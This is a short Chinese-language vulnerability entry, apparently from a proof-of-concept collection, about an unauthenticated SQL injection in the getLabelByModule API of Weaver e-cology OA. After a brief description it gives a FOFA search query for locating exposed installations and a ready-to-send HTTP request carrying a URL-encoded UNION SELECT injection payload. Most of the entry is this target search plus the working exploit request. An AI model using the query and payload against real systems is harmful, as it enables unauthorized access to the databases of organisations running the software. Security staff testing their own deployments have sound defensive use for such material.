# 泛微OA E-Cology getLabelByModule SQL注入

>泛微协同管理应用平台（e-cology）是一套兼具企业信息门户、知识管理、数据中心、工作流管理、人力资源管理、客户与合作伙伴管理、项目管理、财务管理、资产管理功能的协同商务平台。


## 漏洞编号

暂无

## 漏洞类型

SQL注入

## 简介

由于泛微e-cology未对用户的输入进行有效的过滤，直接将其拼接进了SQL查询语句中，导致系统出现SQL注入漏洞，远程未授权攻击者可利用此漏洞获取敏感信息，进一步利用可能获取目标系统权限等。

## 搜索语法

fofa：`app="泛微-协同办公OA"`

## POC

```http
GET /api/ec/dev/locale/getLabelByModule?moduleCode=1%27)%20union%20all%20select%20%2766666666,%27%20-- HTTP/1.1
Host: {{host}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Connection: close
```

